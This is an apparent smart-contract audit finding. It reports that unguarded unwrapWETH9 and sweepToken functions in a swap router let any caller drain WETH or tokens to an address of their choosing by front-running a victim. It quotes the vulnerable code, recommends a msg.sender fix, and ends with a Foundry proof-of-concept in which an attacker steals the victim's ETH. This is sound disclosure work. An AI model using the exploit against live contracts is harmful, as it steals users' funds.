Audit Report

## Title
Unguarded `unwrapWETH9` and `sweepToken` allow any caller to drain router WETH/token balance to an arbitrary address — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
`unwrapWETH9` and `sweepToken` are `public payable` with no caller restriction and no binding to the original swap initiator. Any address can call either function at any time, specifying an arbitrary `recipient`, and drain the router's entire balance of WETH or any ERC-20. A victim who sends `exactInputSingle(recipient=router)` as a standalone transaction and then calls `unwrapWETH9` in a second transaction is fully exposed to front-running by any observer.

## Finding Description
`PeripheryPayments.unwrapWETH9` (L37–45) and `sweepToken` (L48–55) are unconditionally open:

```solidity
// metric-periphery/contracts/base/PeripheryPayments.sol L37-45
function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(recipient, balanceWETH);   // recipient is attacker-controlled
    }
}
``` [1](#0-0) 

```solidity
// metric-periphery/contracts/base/PeripheryPayments.sol L48-55
function sweepToken(address token, uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceToken = IERC20(token).balanceOf(address(this));
    if (balanceToken < amountMinimum) revert InsufficientToken(token, amountMinimum, balanceToken);
    if (balanceToken > 0) {
        IERC20(token).safeTransfer(recipient, balanceToken);
    }
}
``` [2](#0-1) 

The intended safe usage is an atomic `multicall` that bundles `exactInputSingle(recipient=router)` and `unwrapWETH9` in a single transaction, as demonstrated in the test suite: [3](#0-2) 

The `multicall` implementation uses `delegatecall`, which preserves `msg.sender`, but it imposes no guard preventing `unwrapWETH9` or `sweepToken` from being called outside of a multicall context: [4](#0-3) 

There is no `msg.sender` check, no transient-storage guard tying the call to an active swap, and no minimum-amount enforcement when `amountMinimum = 0`. Any WETH or ERC-20 that reaches the router — whether from a non-multicall swap, a partial multicall that reverts mid-sequence, or any other path — is immediately stealable by any caller specifying an arbitrary `recipient`.

By contrast, `refundETH` correctly forces `msg.sender` as the recipient: [5](#0-4) 

## Impact Explanation
Direct theft of user ETH/token output. A victim who sends `exactInputSingle(tokenIn→WETH, recipient=router)` as a standalone transaction and then attempts to call `unwrapWETH9` in a second transaction will have their entire WETH output stolen by a front-running attacker. The attacker calls `unwrapWETH9(0, attacker)` between the two victim transactions and receives all ETH. Loss equals the full swap output; no residual value remains for the victim. This is a Critical/High direct loss of user principal.

## Likelihood Explanation
The attack is permissionless and requires only standard mempool observation. Any user who does not bundle their swap and unwrap into a single `multicall` — a pattern that is not enforced by the interface or any on-chain guard — is vulnerable. Front-running tooling (MEV bots) makes this trivially automatable on any EVM chain. The attack is repeatable for every such non-atomic transaction.

## Recommendation
Restrict `unwrapWETH9` and `sweepToken` so they always send to `msg.sender`, ignoring the caller-supplied `recipient` parameter. This matches the behavior of `refundETH` and remains correct within a `multicall` because `delegatecall` preserves `msg.sender` as the original transaction sender:

```solidity
function unwrapWETH9(uint256 amountMinimum, address /*recipient*/) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(msg.sender, balanceWETH);
    }
}
```

Apply the same fix to `sweepToken`.

## Proof of Concept
```solidity
// Foundry test sketch
function test_attacker_steals_victim_weth_output() public {
    // Victim swaps token1 → WETH, directing output to the router (standalone tx)
    vm.prank(victim);
    router.exactInputSingle(ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(token1),
        tokenOut: address(weth),
        zeroForOne: false,
        amountIn: 3_000,
        amountOutMinimum: 0,
        recipient: address(router),   // WETH lands on router
        deadline: block.timestamp + 1,
        priceLimitX64: type(uint128).max,
        extensionData: ""
    }));

    uint256 routerWeth = weth.balanceOf(address(router));
    assertGt(routerWeth, 0, "router holds victim WETH");

    // Attacker front-runs victim's unwrapWETH9 call
    uint256 attackerEthBefore = attacker.balance;
    vm.prank(attacker);
    router.unwrapWETH9(0, attacker);   // amountMinimum=0, recipient=attacker

    assertEq(weth.balanceOf(address(router)), 0, "router drained");
    assertEq(attacker.balance - attackerEthBefore, routerWeth, "attacker received victim ETH");
}
```
